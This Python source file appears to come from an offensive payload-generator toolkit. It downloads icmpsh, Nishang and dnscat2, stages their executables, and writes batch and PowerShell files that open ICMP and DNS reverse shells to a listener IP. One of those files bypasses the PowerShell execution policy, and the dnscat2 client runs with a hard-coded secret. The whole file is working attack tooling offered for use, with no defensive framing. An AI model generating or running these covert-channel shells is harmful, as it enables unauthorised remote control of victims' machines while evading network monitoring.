#! /usr/bin/env python3

import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()


##  ICMP and DNS Connections/Shell
def gen_300():

  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating ICMP & DNS  Payloads NOW!" + m.bcolors.ENDC)
  print("\tChecking if icmpsh is installed")
  icmpsh = "/opt/icmpsh"
  if not os.path.exists(icmpsh):
      print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Installing ICMPSH NOW ------>")
      os.system("cd /opt/ && git clone https://github.com/inquisb/icmpsh.git")

  print("\tChecking if Nishang is installed")
  nishang = "/opt/nishang"
  if not os.path.exists(nishang):
      print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Installing NISHANG NOW ------>")
      os.system("cd /opt/ && git clone https://github.com/samratashok/nishang.git")

  print("\tChecking if DNSCat2 is installed")
  dnscat2 = "/opt/dnscat2"
  if not os.path.exists(dnscat2):
      print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Installing DNSCat2 NOW ------>")
      os.system("cd /opt/ && git clone https://github.com/iagox86/dnscat2.git")
      os.system("cd /opt/dnscat2/server/ && gem install bundler && bundle install")
  print("\tMoving files!!")
  os.system("cp ./src/icmpsh.sh " + m.targetfile + "300-ICMP-Listener.sh")
  os.system("cp ./src/DNScat2-SERVER.sh " + m.targetfile + "301-DNScat2-Listener.sh")
  os.system("cp ./src/icmpsh.exe " + m.targetfile + "302-icmpsh.exe")
  os.system("cp ./src/dnscat2.exe " + m.targetfile + "303-dnscat2.exe")
  os.system("cp /opt/nishang/Shells/Invoke-PowerShellIcmp.ps1 " + m.targetfile + "304-Invoke-PowerShellIcmp.ps1")
  os.system("cp ./src/dnscat2.ps1 " + m.targetfile + "305-Invoke-DNSc.ps1")

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating icmpsh BAT file...")
  icmpsh_bat_file = open(m.targetfile + "306-ICMPSH.bat", "w")
  icmpsh_bat_file.write("""cmd /k 302-icmpsh.exe -t %s -d 500 -b 30 -s 128
""" % m.listener_ip)
  icmpsh_bat_file.close()

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating icmpsh PS HowTo file...")
  icmpsh_ps_file = open(m.targetfile + "307-ICMPSH-ps.txt", "w")
  icmpsh_ps_file.write("""NOTE: Below are the commands to input into PS. If PS does not work move on to PowerShell_ISE or PowerShell 86.

powershell.exe -NoProfile -ExecutionPolicy Bypass

Import-Module ./304-Invoke-PowerShellIcmp.ps1

Invoke-PowerShellIcmp -IPAddress %s

""" % m.listener_ip)
  icmpsh_ps_file.close()

  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating DNSCat2 BAT file...")
  dnscat_bat_file = open(m.targetfile + "308-DNSCat.bat", "w")
  dnscat_bat_file.write("""cmd /k 303-dnscat2.exe --dns server=%s,port=53 --secret=password
""" % m.listener_ip)
  dnscat_bat_file.close()
